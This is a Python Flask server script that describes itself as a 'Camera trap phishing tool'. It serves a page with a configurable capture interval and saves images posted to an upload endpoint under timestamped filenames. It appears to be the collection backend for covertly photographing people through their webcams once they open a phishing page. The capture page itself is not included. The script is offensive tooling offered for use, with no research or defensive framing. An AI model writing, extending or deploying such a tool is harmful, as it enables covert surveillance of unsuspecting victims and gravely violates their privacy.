
import argparse
import os
from flask import Flask, request, render_template, redirect, url_for
from werkzeug.utils import secure_filename
import threading
import time

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = 'uploads'
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

# Global variables for interval and port
capture_interval = 5000  # milliseconds
port = 5000


@app.route('/')
def index():
    # Render HTML with embedded JavaScript that uses our interval setting
    return render_template('index.html', interval=capture_interval)


@app.route('/upload', methods=['POST'])
def upload_image():
    if 'image' not in request.files:
        return 'No image uploaded', 400
    
    file = request.files['image']
    if file.filename == '':
        return 'No selected file', 400
    
    if file:
        # Generate a unique filename with timestamp
        timestamp = int(time.time() * 1000)
        filename = f"{timestamp}.jpg"
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(filepath)
        return 'Image saved successfully', 200


def run_server(port):
    app.run(host='0.0.0.0', port=port, debug=False)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Camera trap phishing tool')
    parser.add_argument('-i', '--interval', type=int, default=5000, 
                        help='Capture interval in milliseconds (default: 5000)')
    parser.add_argument('-p', '--port', type=int, default=5000,
                        help='Port to run the server on (default: 5000)')
    
    args = parser.parse_args()
    capture_interval = args.interval
    port = args.port
    

    # Run the Flask app in a separate thread
    server_thread = threading.Thread(target=run_server, args=(port,))
    server_thread.daemon = True
    server_thread.start()
    
    # Print the server URL
    print(f"Server running on http://localhost:{port}")
    
    # Keep the main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\\nServer stopped.")
